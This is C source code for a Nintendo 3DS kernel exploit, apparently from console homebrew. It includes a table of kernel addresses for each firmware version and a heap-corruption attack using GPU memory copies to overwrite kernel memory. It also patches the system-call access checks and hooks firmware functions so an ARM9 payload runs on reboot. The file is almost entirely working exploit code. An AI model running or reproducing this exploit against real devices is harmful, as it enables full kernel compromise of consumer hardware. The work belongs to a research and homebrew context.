/*
 * Copyright (C) 2015 Aliak <aliakr18@gmail.com>
 * Copyright (C) 2015 173210 <root.3.173210@live.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <3ds.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <inttypes.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>
#include <errno.h>
#include "arm9payload.h"
#include "arm11.h"

// Uncomment to have progress printed w/ printf
#define DEBUG_PROCESS

static const int32_t bx_lr = 0xE12FFF1E; // bx lr
static const int32_t nop = 0xE320F000; // nop {0}
static const int32_t ldr_pc_pc_4 = 0xE51FF004; // ldr pc, [pc, #4]

static u32 nopSlide[0x1000] __attribute__((aligned(0x1000)));

static int32_t *createThreadPatchPtr = NULL;
static int32_t *svcPatchPtr = NULL;

static int (* reboot)(int, int, int, int) = NULL;
static void *sharedPtr = NULL;
static int32_t *arm11Payload = NULL;
static int32_t *hook0 = NULL;
static int32_t *hook1 = NULL;
#ifdef DEBUG_PROCESS
static int svcIsPatched = 0;
#endif

static int gshaxCopy(void *dst, void *src, unsigned int len)
{
	void *p;
	int i;

	if (dst == NULL || src == NULL)
		return -1;

	p = linearMemAlign(0x10000, 0x40);
	if (p == NULL)
		return -1;

	// Sometimes I don't know the actual value to check (when copying from unknown memory)
	// so instead of using check_mem/check_off, just loop "enough" times.
	for (i = 0; i < 5; ++i) {
		GSPGPU_FlushDataCache (NULL, src, len);
		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
		GSPGPU_FlushDataCache (NULL, p, 16);
		GX_SetTextureCopy(NULL, src, 0, p, 0, 0x40, 8);
	}

	linearFree(p);

	return 0;
}

static int getPatchPtr()
{
	typedef struct {
		int32_t ver;

		int32_t *createThreadPatchPtr;
		int32_t *svcPatchPtr;

		int (* reboot)(int, int, int, int);
		void *sharedPtr;
		int32_t *arm11Payload;
		int32_t *hook0;
		int32_t *hook1;

		void *pdnReg;
		void *pxiReg;
		void *hook0ret;
	} verptr_t;

	static const verptr_t ctr[] = {
		{
			.ver = 0x02220000,

			.createThreadPatchPtr = (void *)0xEFF83C97,
			.svcPatchPtr = (void *)0xEFF827CC,

			.reboot = (void *)0xFFF748C4,
			.sharedPtr = (void *)0xF0000000,
			.arm11Payload = (void *)0xEFFF4C80,
			.hook0 = (void *)0xEFFE4DD4,
			.hook1 = (void *)0xEFFF497C,

			.pdnReg = (void *)0xFFFD0000,
			.pxiReg = (void *)0xFFFD2000,
			.hook0ret = (void *)0xFFF84DDC
		}, {
			.ver = 0x02230600, // 2.35-6 5.0.0

			.createThreadPatchPtr = (void *)0xEFF8372F,
			.svcPatchPtr = (void *)0xEFF822A8,

			.reboot = (void *)0xFFF64B94,
			.sharedPtr = (void *)0xF0000000,
			.arm11Payload = (void *)0xEFFF4C80,
			.hook0 = (void *)0xEFFE55BC,
			.hook1 = (void *)0xEFFF4978,

			.pdnReg = (void *)0xFFFD0000,
			.pxiReg = (void *)0xFFFD2000,
			.hook0ret = (void *)0xFFF765C4,
		}, {
			.ver = 0x02240000, // 2.36-0 5.1.0

			.createThreadPatchPtr = (void *)0xEFF8372B,
			.svcPatchPtr = (void *)0xEFF822A4,

			.reboot = (void *)0xFFF64B90,
			.sharedPtr = (void *)0xF0000000,
			.arm11Payload = (void *)0xEFFF4C80,
			.hook0 = (void *)0xEFFE55B8,
			.hook1 = (void *)0xEFFF4978,

			.pdnReg = (void *)0xFFFD0000,
			.pxiReg = (void *)0xFFFD2000,
			.hook0ret = (void *)0xFFF765C0
		}, {
			.ver = 0x02250000, // 2.37-0 6.0.0

			.createThreadPatchPtr = (void *)0xEFF8372B,
			.svcPatchPtr = (void *)0xEFF822A4,

			.reboot = (void *)0xFFF64A78,
			.sharedPtr = (void *)0xF0000000,
			.arm11Payload = (void *)0xEFFF4C80,
			.hook0 = (void *)0xEFFE5AE8,
			.hook1 = (void *)0xEFFF4978,

			.pdnReg = (void *)0xFFFD0000,
			.pxiReg = (void *)0xFFFD2000,
			.hook0ret = (void *)0xFFF76AF0
		}, {
			.ver = 0x02260000, // 2.38-0 6.1.0

			.createThreadPatchPtr = (void *)0xEFF8372B,
			.svcPatchPtr = (void *)0xEFF822A4,

			.reboot = (void *)0xFFF64A78,
			.sharedPtr = (void *)0xF0000000,
			.arm11Payload = (void *)0xEFFF4C80,
			.hook0 = (void *)0xEFFE5AE8,
			.hook1 = (void *)0xEFFF4978,

			.pdnReg = (void *)0xFFFD0000,
			.pxiReg = (void *)0xFFFD2000,
			.hook0ret = (void *)0xFFF76AF0
		}, {
			.ver = 0x02270400, // 2.39-4 7.0.0
			.createThreadPatchPtr = (void *)0xEFF8372F,
			.svcPatchPtr = (void *)0xEFF822A8,

			.reboot = (void *)0xFFF64AB0,
			.sharedPtr = (void *)0xF0000000,
			.arm11Payload = (void *)0xEFFF4C80,
			.hook0 = (void *)0xEFFE5B34,
			.hook1 = (void *)0xEFFF4978,

			.pdnReg = (void *)0xFFFD0000,
			.pxiReg = (void *)0xFFFD2000,
			.hook0ret = (void *)0xFFF76B3C
		}, {
			.ver = 0x02280000, // 2.40-0 7.2.0

			.createThreadPatchPtr = (void *)0xEFF8372B,
			.svcPatchPtr = (void *)0xEFF822A4,

			.reboot = (void *)0xFFF64AAC,
			.sharedPtr = (void *)0xE0000000,
			.arm11Payload = (void *)0xDFFF4C80,
			.hook0 = (void *)0xEFFE5B30,
			.hook1 = (void *)0xEFFF4978,

			.pdnReg = (void *)0xFFFD0000,
			.pxiReg = (void *)0xFFFD2000,
			.hook0ret = (void *)0xFFF76B38

		}, {
			.ver = 0x022C0600, // 2.44-6 8.0.0

			.createThreadPatchPtr = (void *)0xDFF83767,
			.svcPatchPtr = (void *)0xDFF82294,

			.reboot = (void *)0xFFF54BAC,
			.sharedPtr = (void *)0xE0000000,
			.arm11Payload = (void *)0xDFFF4C80,
			.hook0 = (void *)0xDFFE4F28,
			.hook1 = (void *)0xDFFF4974,

			.pdnReg = (void *)0xFFFBE000,
			.pxiReg = (void *)0xFFFC0000,
			.hook0ret = (void *)0xFFF66F30
		}, {
			.ver = 0x022E0000, // 2.26-0 9.0.0

			.createThreadPatchPtr = (void *)0xDFF83837,
			.svcPatchPtr = (void *)0xDFF82290,

			.reboot = (void *)0xFFF151C0,
			.sharedPtr = (void *)0xE0000000,
			.arm11Payload = (void *)0xDFFF4C80,
			.hook0 = (void *)0xDFFE59D0,
			.hook1 = (void *)0xDFFF4974,

			.pdnReg = (void *)0xFFFC2000,
			.pxiReg = (void *)0xFFFC4000,
			.hook0ret = (void *)0xFFF279D8
		}
	};

	const verptr_t *p;
	int32_t ver;
	u8 isN3DS;

	// Get proper patch address for our kernel -- thanks yifanlu once again
	ver = *(int32_t *)0x1FF80000; // KERNEL_VERSION register
	createThreadPatchPtr = NULL;
	svcPatchPtr = NULL;

	if (ver >= 0x022C0600) {
		APT_CheckNew3DS(NULL, &isN3DS);
		if (isN3DS) {
#ifdef DEBUG_PROCESS
			puts("New 3DS is not supported.");
#endif
			return -1;
		}
	}

	for (p = ctr; p != ctr + sizeof(ctr) / sizeof(verptr_t); p++)
		if (p->ver == ver) {
			createThreadPatchPtr = p->createThreadPatchPtr;
			svcPatchPtr = p->svcPatchPtr;

			reboot = p->reboot;
			sharedPtr = p->sharedPtr;
			arm11Payload = p->arm11Payload;
			hook0 = p->hook0;
			hook1 = p->hook1;

			pdnReg = p->pdnReg;
			pxiReg = p->pxiReg;
			hook0ret = p->hook0ret;

			return 0;
		}

#ifdef DEBUG_PROCESS
	printf("Unrecognized kernel version 0x%" PRIx32 ".\n",
		ver);
#endif
	return -1;
}

static int arm11Kxploit()
{
	const size_t allocSize = 0x2000;
	const size_t freeOffset = 0x1000;
	const size_t freeSize = allocSize - freeOffset;
	const size_t bufSize = 0x10000;
	int32_t *buf;
	void *p, *free;
	int32_t saved[8];
	u32 i;

	if (createThreadPatchPtr == NULL)
		return -EFAULT;

	buf = linearMemAlign(bufSize, 0x10000);
	if (buf == NULL)
		return -ENOMEM;

	// Wipe memory for debugging purposes
	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
		buf[i] = 0xDEADBEEF;

	// Part 1: corrupt kernel memory
	svcControlMemory((u32 *)&p, 0, 0, allocSize, MEMOP_ALLOC_LINEAR, 0x3);
	free = (void *)((uintptr_t)p + freeOffset);

	puts("Freeing memory");
	svcControlMemory(&i, (u32)free, 0, freeSize, MEMOP_FREE, 0);

	puts("Backing up heap area");
	gshaxCopy(buf, free, 0x20);

	memcpy(saved, buf, sizeof(saved));

	buf[0] = 1;
	buf[1] = (uint32_t)createThreadPatchPtr;
	buf[2] = 0;
	buf[3] = 0;

#ifdef DEBUG_PROCESS
	printf("Overwriting free pointer 0x%p\n", p);
#endif

	// Trigger write to kernel
	gshaxCopy(free, buf, 0x10);
	svcControlMemory(&i, (u32)p, 0, freeOffset, MEMOP_FREE, 0);

#ifdef DEBUG_PROCESS
	puts("Triggered kernel write");
	gfxFlushBuffers();
	gfxSwapBuffers();
#endif

	memcpy(buf, saved, sizeof(saved));
	puts("Restoring heap");
	gshaxCopy(p, buf, 0x20);

	 // Part 2: trick to clear icache
	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
		buf[i] = nop;
	buf[i - 1] = bx_lr;

	gshaxCopy(nopSlide, buf, bufSize);

	HB_FlushInvalidateCache();
	((void (*)())nopSlide)();

#ifdef DEBUG_PROCESS
	puts("Exited nop slide");
	gfxFlushBuffers();
	gfxSwapBuffers();
#endif

	getPatchPtr();

	return 0;
}

static inline void synci()
{
	__asm__("mov r0, #0\n"
		"mcr p15, 0, r0, c7, c10, 0\n" // Clean Dcache
		"mcr p15, 0, r0, c7, c5, 0\n" // Invalidate Icache
		::: "r0");
}

static int arm9Exploit()
{
	int32_t *src, *dst;

	if (reboot == NULL || arm11Payload == NULL || hook0 == NULL
		|| arm11PayloadTop == NULL || arm11PayloadBtm == NULL)
		return -EFAULT;

	__asm__("clrex");

	// ARM9 code copied to FCRAM 0x23F00000
	memcpy((void *)((uintptr_t)sharedPtr | 0x03F00000),
		arm9payload_bin, arm9payload_bin_size);
	// Write function hooks
	dst = arm11Payload;
	for (src = arm11PayloadTop; src != arm11PayloadBtm; src++) {
		*dst = *src;
		dst++;
	}

	hook0[0] = ldr_pc_pc_4;
	hook0[1] = 0xFFFF0C80; // arm11Payload

	hook1[0] = ldr_pc_pc_4;
	hook1[1] = 0x1FFF4C84; // arm11Payload + 4

	synci();

	return reboot(0, 0, 2, 0);
}

#ifdef DEBUG_PROCESS
static void test()
{
}
#endif

static void __attribute__((naked)) arm11Kexec()
{

	__asm__("add sp, sp, #8\n");

	// Fix up memory
	if (createThreadPatchPtr != NULL)
		createThreadPatchPtr[2] = 0x8DD00CE5;

	// Give us access to all SVCs (including 0x7B, so we can go to kernel mode)
	if (svcPatchPtr != NULL) {
		svcPatchPtr[0] = nop;
		svcPatchPtr[2] = nop;
#ifdef DEBUG_PROCESS
		svcIsPatched = 1;
#endif
	}

	synci();

	arm9Exploit();

	__asm__("movs r0, #0\n"
		 "pop {pc}\n");
}

bool exploit()
{
	u32 result;
	u32 *p;
	int ret;

	HB_ReprotectMemory(nopSlide, 4, 7, &result);

	for (p = nopSlide; p != nopSlide + sizeof(nopSlide) / sizeof(u32); p++)
		*p = nop;
	p[-1] = bx_lr;
	HB_FlushInvalidateCache();

#ifdef DEBUG_PROCESS
	puts("Testing nop slide");
#endif

	((void (*)())nopSlide)();

#ifdef DEBUG_PROCESS
	puts("Exited nop slide");
#endif

	ret = getPatchPtr();
	if (ret)
		return ret;
#ifdef DEBUG_PROCESS
	printf("createThread Address: 0x%p\nSVC Address: 0x%p\n",
		createThreadPatchPtr, svcPatchPtr);

	puts("Setting up ARM11 kernel exploit");
#endif
	ret = arm11Kxploit();
	if (ret)
		return ret;

#ifdef DEBUG_PROCESS
	puts("Executing code under ARM11 Kernel");
#endif
	__asm__("ldr r0, =%0\n"
		"svc #8\n"
		:: "i"(arm11Kexec) : "r0");
#ifdef DEBUG_PROCESS
	if (svcIsPatched) {
		puts("Testing SVC 0x7B");
		__asm__("ldr r0, =%0\n"
			"svc #0x7B\n"
			:: "i"(test) : "r0");
	}
#endif

	return true;
}
